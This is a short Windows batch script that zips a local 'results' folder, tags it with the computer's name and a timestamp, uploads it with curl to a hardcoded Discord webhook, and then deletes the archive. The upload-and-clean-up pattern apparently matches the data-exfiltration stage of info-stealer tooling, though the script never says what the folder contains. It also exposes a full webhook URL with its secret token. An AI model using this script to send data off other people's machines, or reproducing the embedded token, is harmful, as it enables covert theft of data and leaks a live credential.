@echo off
setlocal EnableDelayedExpansion

set "WEBHOOK_URL=https://discord.com/api/webhooks/1316401544433897482/EwCP2AeMxTMazqM5m4HlzgOpIhQG2lGPX-b5kGAtEKrqom9OaXjyQw1Xiz05yNKtBw5B"


REM Check if results folder exists
if not exist "results" (
    echo [ERROR] Results folder not found!
    exit /b 1
)

REM Create timestamp using date and time commands
for /f "tokens=1-4 delims=/ " %%A in ('date /t') do set "date=%%D%%B%%C"
for /f "tokens=1-3 delims=:." %%A in ('time /t') do set "time=%%A%%B"
set "timestamp=%date%_%time%"

echo [DEBUG] Creating zip file...
powershell -Command "Compress-Archive -Path results -DestinationPath 'results_%timestamp%.zip' -Force"
if %ERRORLEVEL% NEQ 0 (
    echo [ERROR] PowerShell compression failed!
    exit /b 1
)
REM Check if zip was created
if not exist "results_%timestamp%.zip" (
    echo [ERROR] Failed to create zip file!
    exit /b 1
)

echo [DEBUG] Uploading to Discord...
set "message=Results from %COMPUTERNAME% at %timestamp%"
curl -v -F "payload_json={\"content\":\"%message%\"}" -F "file=@results_%timestamp%.zip" "%WEBHOOK_URL%"

REM Check curl exit code
if %ERRORLEVEL% NEQ 0 (
    echo [ERROR] Upload failed with error code %ERRORLEVEL%
    exit /b 1
)

echo [DEBUG] Upload completed. Cleaning up...
del "results_%timestamp%.zip"
echo [DEBUG] Cleanup completed.
